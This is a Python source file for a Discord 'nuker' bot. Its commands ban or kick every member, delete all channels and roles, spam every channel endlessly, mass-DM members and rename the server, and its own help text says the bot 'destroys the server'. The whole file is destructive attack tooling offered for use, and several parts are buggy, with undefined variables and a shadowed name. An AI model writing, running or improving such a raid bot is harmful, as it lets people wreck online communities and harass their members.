print("Terminal Nuker | Made by Strosity.\n")
import os
import colorama
from colorama import Fore
import discord
import asyncio
from discord.ext import commands



###########SETUP###############
prefix  = "?"                                                       #
token = "TOKEN"                                             #
spam_messages = "Spam message"          #
massdm = "Massdm Message"                   #
rolenames = "Role Names To Spam"          #                                                           
channels = "Channels To Spam Names"   #
sname = "SERVER NAME TO CHANGE"    #
key = input("Terminal Password\n> ")      #
#############################


while True:
    if key =="strosityischad":
        print("Password is correct!")
        print(f"{Fore.YELLOW}Enter to pass: ")
        break
    else:
        print("Invalid password! Restart the program!")

def Clear():
    os.system('cls')


bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), help_command=None) # ENABLE ALL INTENTS!
bot.remove_command("help")


os.system('cls' if os.name == 'nt' else 'clear')
@bot.event
async def on_ready():
    Clear()

    print(f'''

{Fore.RESET}{Fore.YELLOW}▄▄▄█████▓▓█████  ██▀███   ███▄ ▄███▓ ██▓ ███▄    █  ▄▄▄       ██▓    
{Fore.RESET}{Fore.BLUE}▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █ ▒████▄    ▓██▒    
{Fore.RESET}{Fore.GREEN}▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒▓██    ▓██░▒██▒▓██  ▀█ ██▒▒██  ▀█▄  ▒██░    
{Fore.RESET}{Fore.MAGENTA}░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  ▒██    ▒██ ░██░▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██░    
{Fore.RESET}{Fore.RED}  ▒██▒ ░ ░▒████▒░██▓ ▒██▒▒██▒   ░██▒░██░▒██░   ▓██░ ▓█   ▓██▒░██████▒
{Fore.RESET}{Fore.YELLOW}  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░▓  ░
{Fore.RESET}{Fore.GREEN}    ░     ░ ░  ░  ░▒ ░ ▒░░  ░      ░ ▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░ ▒  ░
  ░         ░     ░░   ░ ░      ░    ▒ ░   ░   ░ ░   ░   ▒     ░ ░   
            ░  ░   ░            ░    ░           ░       ░  ░    ░  ░
                                                                     
{Fore.RESET}{Fore.BLUE}                                                                                     
------------------------------------------- Terminal 2 - Made by Strosity
{Fore.RESET}{Fore.YELLOW}Bot command = {prefix}help
{Fore.RESET}{Fore.GREEN}Bot spam = {spam_messages}
{Fore.RESET}{Fore.RED}Bot channels = {channels}
{Fore.RESET}{Fore.BLUE}Massdm Spam = {massdm}
{Fore.RESET}{Fore.MAGENTA}Role Spam = {rolenames}
{Fore.RESET}{Fore.YELLOW}Bot token = {token}''' + Fore.RESET)

@bot.command()
async def massdm(ctx):
    for member in list(ctx.guild.members):
        try:
            await member.send(massdm)
        except:
            pass
@bot.event
async def on_guild_channel_create(channel):
     while True:
        await channel.send(spam_message)
#help commamd
@bot.command()
async def help(ctx):
        await ctx.message.delete()
        embed = discord.Embed(color=000000, timestamp=ctx.message.created_at)
        embed.set_author(name=" 🌠 Terminal Nuker")
        embed.add_field(name="`NUKE`", value="- destroys the server")
        embed.add_field(name="`SPAM`", value="- spams the server")
        embed.add_field(name="`BANALL`", value="- bans all members in the server")
        embed.add_field(name="`KICKALL`", value="- kicks all members in the server")
        embed.add_field(name="`MASSDM`", value="- dms everyone in the server with the message provided")
        embed.add_field(name="`SNAME`", value="- changes the server name!")
        embed.add_field(name="`ROLES`", value="- deletes all roles in the server, and creates new ones")
        embed.add_field(name="`DCHANNELS`", value="- deletes all channels in the server")
        embed.add_field(name="`SCHANNELS`", value="- spams channels in the server")
        embed.set_image(url="")
        await ctx.send(embed=embed)

#commands  

@bot.command()
async def spam(ctx):
  guild = ctx.message.guild
  await ctx.message.delete()
  print(f"{Fore.GREEN}Spamming all channels")
  while True:
    for channel in guild.text_channels:
      await channel.send(spam)
        

@bot.command(pass_context=True)
async def roles(ctx, amount):
  guild = ctx.message.guild
  for role in guild.roles:
    try:
      await role.delete()
      print(f"{Fore.GREEN}Role: {role} has been deleted")
    except:
      pass
      print(f"{Fore.RED}Role: {role} could not be deleted")
  for i in range(amount):
    try:
      await guild.create_role(name=rolenames)
      print(f"{Fore.GREEN}Role has been created")
    except:
      print(f"{Fore.RED}Role could not be created")
  

@bot.command(pass_context=True)
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild

    for member in list(ctx.message.guild.members):
       try:
           await member.ban(member)
           print(f"{Fore.GREEN}User" +member.name + "Has Been  Banned")
       except:
           pass
    print(f"{Fore.GREEN} Banned.")

    try:
      for channel in ctx.guild.channels:
        await channel.delete()
        print(f"{Fore.GREEN}Channel deleted")
    except:
      pass
      print(f"{Fore.Red}Channel could not be deleted")

    try:
      for i in range(100):
        guild = ctx.message.guild
        await guild.create_text_channel(channels)
        print(f"{Fore.GREEN}Channel created")
    except:
      pass
      print(f"{Fore.RED}Channel could not be created")
          
    for role in guild.roles:
      try:
        await role.delete()
        print(f"{Fore.GREEN}Role: {role} has been deleted")
      except:
        pass
        print(f"{Fore.RED}Role: {role} could not be deleted")

    while True:
      try:
        await guild.create_role(name=rolenames)
        print(f"{Fore.GREEN} Roles Have Been Created")
      except:
        print(f"{Fore.RED}Role could not be created")

@bot.command()
async def Sname(ctx):
    await ctx.guild.edit(name=sname)

@bot.command()
async def dchannels(ctx):
  for channel in ctx.guild.channels:
      await channel.delete()

#MAKE CHANNELS##
@bot.command(pass_context=True)
async def schannels(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    await guild.create_text_channel(channels) 

@bot.command()
async def banall(ctx):
  for user in list(ctx.guild.members):
     try:
        await user.ban(reason="Reason")
        print(f"{Fore.GREEN} Kicked {strosity} from guild.")
     except:
         pass
  print(f"{Fore.BLUE}Banned all members!")
  
@bot.command(pass_context=True)
async def kickall(ctx):
    guild = ctx.message.guild
    for strosity in list(ctx.message.guild.members):
        try:    
            await guild.kick(strosity)
            print(f"{Fore.GREEN} Kicked {strosity} from guild.")
        except:
            pass
    print(f"{Fore.GREEN}Kicking ever member has been ordered!")        
        
bot.run(token)
